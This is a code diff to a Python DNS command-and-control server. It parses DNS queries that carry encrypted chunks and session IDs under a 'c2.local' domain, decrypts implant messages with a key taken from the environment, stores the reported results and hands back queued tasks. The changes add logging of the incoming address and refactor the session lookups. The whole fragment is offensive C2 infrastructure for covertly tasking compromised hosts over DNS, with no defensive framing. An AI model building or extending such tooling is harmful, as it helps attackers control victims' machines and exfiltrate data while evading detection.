@@ -7,6 +7,7 @@ import os
 KEY = bytes.fromhex(os.getenv("C2_KEY"))  # load key from environment variable
 
 def handle_query(data, addr, sock):
+    print(f"Incoming from {addr}")
     request = dnslib.DNSRecord.parse(data)
     qname = str(request.q.qname)   # e.g. "2.chunk1.chunk2.session123.c2.local."
 
@@ -20,12 +21,12 @@ def handle_query(data, addr, sock):
     message = crypto.decrypt(encrypted_data, KEY)
 
     # step 2 — if this is a result report (not a heartbeat), store it
-    if message != "READY" and session_id in queue_store.sessions:
-        last_task = queue_store.sessions[session_id]["last_task"] or ""
+    if message != "READY" and queue_store.session_exists(session_id):
+        last_task = queue_store.get_last_task(session_id) or ""
         queue_store.store_result(session_id, last_task, message)
 
     # step 3 — get next task for this session
-    if session_id not in queue_store.sessions:
+    if not queue_store.session_exists(session_id):
         task = "WAIT"
     else:
         task = queue_store.get_next_task(session_id) or "WAIT"
